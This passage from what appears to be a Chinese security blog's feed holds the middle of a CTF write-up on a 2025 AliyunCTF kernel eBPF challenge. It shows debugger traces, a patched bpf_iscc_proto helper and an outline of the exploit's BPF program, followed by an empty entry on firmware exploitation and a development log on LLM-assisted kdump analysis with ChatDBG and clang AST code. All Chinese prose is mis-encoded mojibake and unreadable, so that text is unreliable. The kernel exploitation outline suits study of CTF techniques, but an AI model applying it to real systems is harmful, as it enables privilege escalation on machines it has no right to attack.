class="number">0xffffffff81c51382</span>          &lt;bpf_test_run+<span class="number">258</span>&gt;</span><br><span class="line">    â†“</span><br><span class="line">   <span class="number">0xffffffff81c51382</span> &lt;bpf_test_run+<span class="number">258</span>&gt;    mov    dword ptr [r14], r13d</span><br><span class="line">   <span class="number">0xffffffff81c51385</span> &lt;bpf_test_run+<span class="number">261</span>&gt;    mov    rdi, qword ptr [rsp + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0xffffffff81c5138a</span> &lt;bpf_test_run+<span class="number">266</span>&gt;    mov    esi, <span class="number">0x200</span>                      ESI =&gt; <span class="number">0x200</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /run/media/zjw1nd/Data/ctf/<span class="number">2025</span>AliyunCTF/beebee_8a1bd1fde6215e85ebd1123bcf306bcdcbc74ec34fad1f0d1974fe6ff7590b45.tar/linux<span class="number">-6.6</span><span class="number">.74</span>/include/linux/bpf.h:<span class="number">1213</span></span><br><span class="line">   <span class="number">1208</span> <span class="type">static</span> __always_inline __nocfi <span class="type">unsigned</span> <span class="type">int</span> bpf_dispatcher_nop_func(</span><br><span class="line">   <span class="number">1209</span>         <span class="type">const</span> <span class="type">void</span> *ctx,</span><br><span class="line">   <span class="number">1210</span>         <span class="type">const</span> <span class="keyword">struct</span> bpf_insn *insnsi,</span><br><span class="line">   <span class="number">1211</span>         <span class="type">bpf_func_t</span> bpf_func)</span><br><span class="line">   <span class="number">1212</span> &#123;</span><br><span class="line"> â–º <span class="number">1213</span>         <span class="keyword">return</span> bpf_func(ctx, insnsi);</span><br><span class="line">   <span class="number">1214</span> &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ</p><p>ç„¶åä»–ä¼šç”¨ä¸€ä¸ªå¾ˆå·§å¦™çš„è·³è½¬æ¥åˆ°JITç¼–è¯‘çš„ä»£ç å¤„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0xffffffff81f49480</span> &lt;__x86_indirect_thunk_array&gt;       call   <span class="number">0xffffffff81f49486</span>          &lt;__x86_indirect_thunk_array+<span class="number">6</span>&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0xffffffff81f49485</span> &lt;__x86_indirect_thunk_array+<span class="number">5</span>&gt;     int3   </span><br><span class="line">â–º <span class="number">0xffffffff81f49486</span> &lt;__x86_indirect_thunk_array+<span class="number">6</span>&gt;     mov    qword ptr [rsp], rax        [<span class="number">0xffffc90000207cd0</span>] &lt;= <span class="number">0xffffffffc0000670</span> â—‚â€” endbr64 </span><br><span class="line">  <span class="number">0xffffffff81f4948a</span> &lt;__x86_indirect_thunk_array+<span class="number">10</span>&gt;    ret    </span><br></pre></td></tr></table></figure><p>ç”¨ä¸€ä¸ª<code>mov [rsp] rax;ret</code>å®Œæˆäº†ä¸€æ¬¡æ›´åŠ åˆæ³•çš„<code>call rax</code>ã€‚è€Œraxæ­¤æ—¶å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„ä»£ç ä½ç½®äº†ï¼Œä»0xffffffffc0000670å¼€å§‹ã€‚åˆ°è¿™é‡Œæˆ‘ä»¬å¤§æ¦‚èƒ½æ˜ç™½è¿™å¥—ä¸œè¥¿çš„è¿ä½œæµç¨‹ã€‚</p><p>é‚£å®ƒçš„æ ˆå¸§åˆä¸ºä»€ä¹ˆä¼šæ˜¯åˆšåˆšæŒ‡å®šçš„å†…å®¹å‘¢ï¼Ÿ</p><h2 id="æ ¸å¿ƒçš„bpfå­—èŠ‚ç ç¨‹åº">æ ¸å¿ƒçš„bpfå­—èŠ‚ç ç¨‹åº</h2><p>bpfå­—èŠ‚ç ç¨‹åºä¸€å…±è°ƒç”¨äº†ä¸‰ä¸ªå‡½æ•°ï¼Œä¾æ¬¡æ˜¯<code>bpf_map_lookup_elem</code>,<code>aliyunctf_xor</code>å’Œ<code>skb_load_bytes</code>ã€‚</p><p>æ•´ä¸ªexpæ˜¯è¿™æ ·çš„ï¼šå…ˆç”Ÿæˆäº†ä¸€ä¸ªåªè¯»çš„map{0:1}ã€‚æŸ¥çœ‹è¿™ä¸ªpatchä¸­çš„ <code>bpf_iscc</code> å‡½æ•°çš„å‚æ•°é™åˆ¶ï¼Œä¸»è¦ä½“ç°åœ¨ <code>bpf_iscc_proto</code> ç»“æ„ä½“çš„å®šä¹‰ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_iscc_proto</span> =</span> &#123;</span><br><span class="line">.func = bpf_iscc,</span><br><span class="line">.gpl_only = <span class="literal">false</span>,</span><br><span class="line">.pkt_access = <span class="literal">true</span>,</span><br><span class="line">.ret_type = RET_INTEGER,</span><br><span class="line">.arg1_type = ARG_PTR_TO_FIXED_SIZE_MEM | MEM_UNINIT,</span><br><span class="line">.arg1_size = <span class="keyword">sizeof</span>(s64),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.kanxue.com/thread-285786.htm&quot;&gt;https://bbs.kanxue.com/thread-285786.htm&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;é¢˜ç›®å†…å®¹&lt;/</summary>
      
    
    
    
    <category term="WP" scheme="https://zjw1nd.github.io/categories/WP/"/>
    
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>ç½‘å®‰å®è·µä¹‹ç®€å•çš„å›ºä»¶æ¼æ´åˆ©ç”¨</title>
    <link href="https://zjw1nd.github.io/2025/05/19/%E7%BD%91%E5%AE%89%E5%AE%9E%E8%B7%B5%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>https://zjw1nd.github.io/2025/05/19/%E7%BD%91%E5%AE%89%E5%AE%9E%E8%B7%B5%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</id>
    <published>2025-05-19T10:34:12.000Z</published>
    <updated>2025-05-19T10:34:12.135Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>åŸºäºLLMçš„kdumpåˆ†æå¼€å‘æ—¥å¿—ï¼ˆæŒç»­æ›´æ–°ï¼‰</title>
    <link href="https://zjw1nd.github.io/2025/04/30/%E5%9F%BA%E4%BA%8ELLM%E7%9A%84kdump%E5%88%86%E6%9E%90%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zjw1nd.github.io/2025/04/30/%E5%9F%BA%E4%BA%8ELLM%E7%9A%84kdump%E5%88%86%E6%9E%90%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-04-30T08:25:02.000Z</published>
    <updated>2025-05-30T15:28:26.341Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æœ€è¿‘æ›´æ–°2025-04-05ï¼ŒåŸºäºChatDBGå’Œkdump-gdbserverå®ç°äº†pythonä¾¿åˆ©åœ°è·å–è°ƒè¯•ä¿¡æ¯ã€‚æœ€è¿‘æ›´æ–°2025-04-17ï¼Œå¯¹è„šæœ¬åšäº†è¿›ä¸€æ­¥å°è£…ä¸”å°è¯•æ–°çš„æ€è·¯æœ€è¿‘æ›´æ–°2025-4-24ï¼Œè®°å½•äº†æ€è·¯çš„å˜åŒ–ï¼Œç°åœ¨æ€è·¯ä»clang.cindex astè½¬æ¢æˆä½¿ç”¨clangdè¯­è¨€æœåŠ¡å™¨åšlinuxå†…æ ¸ä»£ç æŸ¥æ‰¾æœ€è¿‘æ›´æ–°2025-4-30ï¼Œè®°å½•äº†åœ¨lspå¼€å‘è¿‡ç¨‹ä¸­é—®é¢˜çš„è§£å†³è¿‡ç¨‹æœ€è¿‘æ›´æ–°2025-5-21ï¼Œè®°å½•äº†kgymç›¸å…³å†…å®¹</p></blockquote><h1>ç¯å¢ƒæ­å»º</h1><p>å‚è€ƒ<a href="https://zjw1nd.github.io/2025/03/21/%E5%9F%BA%E4%BA%8Eqemu%E5%92%8Cubuntu-base%E7%9A%84kdump%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/">è¿™é‡Œ</a></p><h1>Kdumpçš„åˆ†ææµç¨‹</h1><p>æˆ‘å¯¹äºAIç›¸å…³çš„æŠ€æœ¯åŒ…æ‹¬Agentä¹‹ç±»ä¸€çªä¸é€šï¼Œæ‰€ä»¥å…ˆæ¥çœ‹æˆ‘ç†Ÿæ‚‰çš„é¢†åŸŸï¼Œå†…æ ¸çš„è°ƒè¯•ä¸åˆ†æã€‚</p><blockquote><p><a href="https://www.cnblogs.com/muahao/p/7452737.html">https://www.cnblogs.com/muahao/p/7452737.html</a></p></blockquote><p>â€œLLMåˆ†æå´©æºƒè½¬å‚¨ç°åœºâ€è¿™ä»¶äº‹æœ‰å¼€æºé¡¹ç›®åœ¨åšï¼Œ<a href="https://github.com/plasma-umass/ChatDBG">ChatDBG</a>å°±æ˜¯ä¸€ä¸ªä¾‹å­ã€‚æˆ‘å…ˆè¯»äº†ä¸‹è¿™ä¸ªé¡¹ç›®çš„æºç ã€‚æ›´å¤šçš„å†…å®¹å°±ä¸èµ˜è¿°ï¼Œå®ƒæ˜¯ä»¥gdb/pdb/lldbç›¸å…³æ’ä»¶çš„å½¢å¼å·¥ä½œçš„ï¼Œä»¥ç†Ÿæ‚‰çš„gdbä¸ºä¾‹ã€‚å®ƒå®ç°äº†ä¸€ä¸ª&quot;why&quot;å‘½ä»¤è®©LLMåˆ†æå´©æºƒæˆ–è€…ç›¸å…³ç°åœºåŸå› ã€‚</p><h2 id="ChatDBGçš„å®ç°">ChatDBGçš„å®ç°</h2><p>æ€»ä½“çš„æ€è·¯æ˜¯å°†ç›¸å…³çš„ä¿¡æ¯æ‰“åŒ…æˆç»“æ„åŒ–çš„æ•°æ®å‘ç»™LLM:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_initial_prompt</span>(<span class="params"></span></span><br><span class="line"><span class="params">    stack: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    error: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    details: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    command_line: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    inputs: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    history: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    extra: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="params">    user_text: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> _concat_prompt(</span><br><span class="line">        _wrap_it(<span class="string">&quot;The program has this stack trace&quot;</span>, stack),</span><br><span class="line">        _wrap_it(<span class="string">&quot;The program encountered the following error&quot;</span>, error, details),</span><br><span class="line">        _wrap_it(<span class="string">&quot;This was the command line&quot;</span>, command_line),</span><br><span class="line">        _wrap_it(<span class="string">&quot;This was the program&#x27;s input&quot;</span>, inputs),</span><br><span class="line">        _wrap_it(<span class="string">&quot;This is the history of some debugger commands I ran&quot;</span>, history),</span><br><span class="line">        _wrap_it(<span class="string">&quot;&quot;</span>, extra),</span><br><span class="line">        _user_text_it(user_text),</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>è¿™äº›ä¼ å…¥çš„å‚æ•°å–å†³äºå„ä¸ªè°ƒè¯•å™¨ç±»è‡ªå·±çš„å®ç°ã€‚å¯¹äºgdbï¼Œå…¶ä»–çš„éƒ½å¥½è¯´ï¼Œä¸»è¦æ ¸å¿ƒå†…å®¹æ˜¯å®ƒé€šè¿‡gdb-pythonæ¥å£å¯¹å †æ ˆåšäº†å›æº¯ï¼Œå¹¶ä¸”æå–äº†å¯¹åº”çš„è°ƒè¯•ä¿¡æ¯ï¼Œå°†æœ€é¡¶éƒ¨çš„ä¸‰ä¸ªå †æ ˆå¤„å¯¹åº”çš„ä¸Šä¸‹åè¡Œçš„æºä»£ç åŠ äº†è¡Œå·ä¹‹åéƒ½æ‰“åŒ…å‘ç»™LLMã€‚</p><p><strong>æ ¸å¿ƒçš„æ€è·¯å°±æ˜¯æƒ³åŠæ³•å°†äººåšçš„ä¸œè¥¿ç”¨ä»£ç è‡ªåŠ¨åŒ–è·å–ï¼Œç»“æ„åŒ–æ‰“åŒ…å‘ç»™LLMï¼Œè®©å®ƒåä¸œè¥¿å‡ºæ¥</strong></p><h2 id="é—®é¢˜">é—®é¢˜</h2><p>é¦–å…ˆï¼Œgdbåªæ”¯æŒELFæ ¼å¼çš„é•œåƒï¼Œéœ€è¦å¯¹makedumpfileåšä¸€äº›é…ç½®ã€‚å…¶å¯¹äºåœ°å€çš„æ˜ å°„å…³ç³»å†™åœ¨ELFå¤´çš„LOADå­—æ®µé‡Œé¢ã€‚ä½†æ˜¯vmcoreæ˜¯æŒ‰ç…§ç‰©ç†åœ°å€æ˜ å°„çš„ï¼Œåœ¨å…³é—­kaslrçš„æƒ…å†µä¸‹ï¼ŒELFå¤´ä¸­åªæœ‰ç›´æ¥æ˜ å°„åœ°å€åŒºåŸŸçš„å†…å®¹ï¼Œè€Œæ²¡æœ‰vmallocç›¸å…³çš„åœ°å€ã€‚å†…æ ¸å¦‚æœä½¿ç”¨vmallocï¼Œå°¤å…¶æ˜¯ç”¨vmallocåˆ†é…æ ˆï¼Œè¿™ä¼šå¯¼è‡´æˆ‘ä»¬çš„æ ˆåœ°å€æ— æ³•è®¿é—®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#0  0xffffffff811d440b in crash_setup_regs (newregs=0xffffc900003cfd18, oldregs=0x0 &lt;fixed_percpu_data&gt;) at ./arch/x86/include/asm/kexec.h:111</span><br><span class="line">#1  __crash_kexec (regs=0x0 &lt;fixed_percpu_data&gt;) at kernel/crash_core.c:119</span><br><span class="line">Backtrace stopped: Cannot access memory at address 0xffffc900003cfdd0</span><br></pre></td></tr></table></figure><p>crashè™½ç„¶æ²¡æœ‰è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯å…¶æ“ä½œå¾ˆå¤æ‚ä¸”æ²¡æœ‰å°è£…çš„apiï¼Œæ¨¡æ‹Ÿç»ˆç«¯æ“ä½œä¼šå¾ˆå‘†è€Œä¸”å…¶ä¸æ”¯æŒè¯»å–vmlinuxçš„è°ƒè¯•ä¿¡æ¯ï¼Œè¦æƒ³æŠŠå †æ ˆåœ°å€å’Œæºç å¯¹åº”ï¼Œéœ€è¦åšå•ç‹¬çš„å¤„ç†å’Œè½¬æ¢ï¼Œåˆ°æ—¶å€™è¿˜éœ€è¦å»ºç«‹è”ç³»ï¼Œéå¸¸éº»çƒ¦ã€‚</p><p>ä»¥æˆ‘ä¸ªäººçš„ç»éªŒæ¥è¯´ï¼Œæƒ³åŠæ³•è®©gdbèƒ½å¤Ÿè°ƒè¯•vmcoreï¼Œç„¶åç”¨gdb-python apiä¼šæ¯”åè€…æ–¹ä¾¿å¾ˆå¤šã€‚æˆ‘ç”šè‡³è€ƒè™‘è¿‡ä¿®æ”¹vmcoreçš„æ–‡ä»¶å¤´ï¼Œä½†æ˜¯è¿™æ›´éº»çƒ¦ï¼Œå¹¶ä¸”æ¯ä¸ªdumpæ–‡ä»¶éƒ½è¦é‡å¤ã€‚åœ¨ç›®å‰æˆ‘è€ƒè™‘å¤´ç—›åŒ»å¤´è„šç—›åŒ»è„šçš„æ–¹æ³•ï¼Œåœ¨å†…æ ¸ç¼–è¯‘é€‰é¡¹é‡Œå…³é—­äº†<code>CONFIG_VMAP_STACK</code>ï¼Œè®©å†…æ ¸æ ˆä¸ç”¨vmallocå»åˆ†é…ï¼Œè¿™æ ·<em>æš‚æ—¶æ€§åœ°</em>è§£å†³äº†gdbæ— æ³•è¯»å–å†…æ ¸æ ˆåœ°å€çš„é—®é¢˜ã€‚ç„¶åé‡‡ç”¨gdb-pythonçš„apiå»å›æº¯å †æ ˆå°±å¯ä»¥äº†ã€‚</p><p>åç»­æˆ‘å‘ç°äº†ä¸€ä¸ªç›¸å…³çš„åº“ï¼Œæœ‰äººä»¥libçš„å½¢å¼å®ç°äº†ä¸€ä¸ª<a href="https://github.com/ptesarik/libkdumpfile">libkdumpfile</a>å¹¶æä¾›äº†pykdumpfileçš„apiï¼Œå®‰è£…ä¹‹åå°±å¯ä»¥ç”¨è¿™å¥—apiåœ¨pythonè§£ævmcoreæ–‡ä»¶è€Œä¸ç”¨å•ç‹¬æ“ä½œcrashäº†ã€‚åŒæ—¶ï¼Œè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç”¨CSç»“æ„æ€æƒ³å®ç°çš„<a href="https://github.com/ptesarik/kdump-gdbserver">kdump-gdbserver</a>,å®ƒèƒ½é€šè¿‡å»ºç«‹ä¸€ä¸ªè¿œç¨‹è°ƒè¯•æœåŠ¡å™¨çš„æ–¹æ³•è®©gdbå»attach vmcoreï¼Œè€Œä¸”ä»£ç å¾ˆè½»é‡ï¼ˆå»ºç«‹åœ¨pykdumpfileçš„åŸºç¡€ä¸Šï¼‰ã€‚</p><p>è¿™æ— ç–‘æˆä¸ºäº†æˆ‘ä»¬çš„é¦–é€‰ï¼Œç»è¿‡<strong>ä¸æ‡ˆåœ°æµ‹è¯•</strong>ï¼Œæˆ‘<em>æš‚æ—¶</em>è·‘é€šäº†è¿™ç©æ„ï¼Œå¹¶ä¸”æµ‹è¯•æˆåŠŸï¼Œèƒ½å¤Ÿé gdbå‘½ä»¤æ¥è·å–å†…æ ¸å´©æºƒç°åœºçš„å †æ ˆä¿¡æ¯äº†ã€‚è¯´æš‚æ—¶æ˜¯å› ä¸ºè¿™ä¸ªé¡¹ç›®æä¾›çš„gdbå‘½ä»¤è¿˜æ˜¯å­˜åœ¨é—®é¢˜ï¼Œæ²¡åŠæ³•å¾ˆå¥½åœ°åˆ†æç°åœºçš„å…¶ä»–çº¿ç¨‹/ä»»åŠ¡ï¼Œä½†æ˜¯ç›®å‰ä¸å¤ªéœ€è¦è¿™äº›ä¿¡æ¯ã€‚æœ‰äº†gdb-pythonè¿™ä¸ªå·¥å…·ä¹‹ååç»­çš„å¾ˆå¤šäº‹éƒ½æ˜¯å¾ˆç®€å•çš„äº†ï¼Œç›´æ¥apiè°ƒç”¨å³å¯ã€‚</p><blockquote><p>ç”šè‡³ç¥æ™ºä¸æ¸…åˆ°å°†vmlinuxå’ŒvmcoreåŒ¹é…é”™äº†è¿˜è®¤çœŸæäº†ä¸ªissueç»™äººå®¶å‘é‚®ä»¶orzï¼ŒPeterè€å“¥äººå¾ˆå¥½ï¼Œä¸“é—¨å›å¤äº†æˆ‘</p></blockquote><p>æ•ˆæœå¦‚ä¸‹ï¼Œè¿™æ˜¯æµ‹è¯•å‡½æ•°æ•ˆæœæ—¶ç”¨æ³¨å†Œçš„æµ‹è¯•å‘½ä»¤åœ¨gdbå†…éƒ¨çš„è¾“å‡º:</p><p><img src="/images/kdump/src_from_bt.png" alt="src_from_bt.png"></p><h1>æ›´å¥½ï¼Œæ›´æ™ºèƒ½ï¼Œæ›´ç¬¦åˆäººç±»æ€ç»´çš„æ£€ç´¢æ–¹å¼ï¼ˆï¼Ÿï¼‰â€”â€”AST</h1><p>æ–‡ä»¶è·¯å¾„è·å–è¿˜æ˜¯æ¯”è¾ƒåƒµç¡¬çš„ï¼Œä¸‹ä¸€æ­¥æˆ‘ä»¬è¦ä¸ºlinuxå†…æ ¸æ„å»ºä¸€ä¸ªèƒ½å¤Ÿåˆ©ç”¨ä»£ç æœ¬èº«çš„ä¾èµ–å…³ç³»åšæŸ¥æ‰¾çš„ä¸œè¥¿ï¼Œåˆ©ç”¨ASTã€‚</p><p>Auto-code-roverå¼€æºçš„éƒ¨åˆ†ï¼ˆåˆ†æpythoné¡¹ç›®ï¼‰ç›´æ¥å°±æ˜¯ç”¨çš„pythonå®˜æ–¹çš„aståº“æ¥å®ç°ç›¸å…³çš„æŸ¥æ‰¾ï¼Œæ‰€ä»¥ç†æ‰€å½“ç„¶åœ°æˆ‘ä»¬çš„æ€è·¯ä¹Ÿä¼šæ¥åˆ°è¿™é‡Œã€‚ä½†æ˜¯æˆ‘ä»¬è¦åˆ†æçš„æ˜¯linuxå†…æ ¸çš„Cä»£ç ï¼Œæ‰€ä»¥è¦è¯·å‡ºclangäº†ã€‚è¿™ä¸ªå¼€æºçš„ç¼–è¯‘å™¨å·¥å…·é“¾åº”å½“å¯ä»¥å¸®åŠ©æˆ‘ä»¬ç²¾å‡†åœ°æŸ¥è¯¢linuxå†…æ ¸åºå¤§çš„ä»£ç ã€‚</p><p>astæŸ¥è¯¢ç›¸å…³çš„å†…å®¹æœ‰ä¸å°‘äº†ï¼Œæ¯”å¦‚æœ‰ä¸€ä¸ªrustå®ç°çš„å‘½ä»¤è¡Œå·¥å…·<code>ast-grep</code>ç­‰ç­‰ã€‚è€Œä¸”clangæœ‰è‡ªå·±çš„pythonåº“ï¼Œç”¨<code>clang.cindex</code>æ¨¡å—å°±å¯ä»¥éå†astè¿›è¡ŒæŸ¥æ‰¾ã€‚ç†æ‰€å½“ç„¶åœ°æˆ‘ä»¬èƒ½å¤Ÿç”¨å®ƒæŸ¥æ‰¾ä¸€ä¸ªCæ–‡ä»¶ä¸­çš„å‡½æ•°ï¼Œç»“æ„ä½“å’Œå®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ–‡æ¡£ä½œè€…: wzx</span></span><br><span class="line"><span class="comment"># æ—¶é—´: 2025å¹´4æœˆ1æ—¥</span></span><br><span class="line"><span class="comment"># æ–‡ä»¶: ClangAstParser.py</span></span><br><span class="line"><span class="comment"># æ–‡ä»¶ä½œç”¨: å®ç°æ–‡ä»¶è¯­æ³•è§£æ</span></span><br><span class="line"><span class="comment"># Modified by zjl (actually Claude-3.7 lol)</span></span><br><span class="line"><span class="keyword">from</span> DataType <span class="keyword">import</span> StructMember,StructDef,FunctionDef,MacroDef</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> clang.cindex <span class="keyword">import</span> Index, CursorKind, TranslationUnit, TypeKind, Cursor</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Dict</span>, <span class="type">Optional</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ParseError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClangASTParser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, file_path: <span class="built_in">str</span>, kernel_root: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>, arch: <span 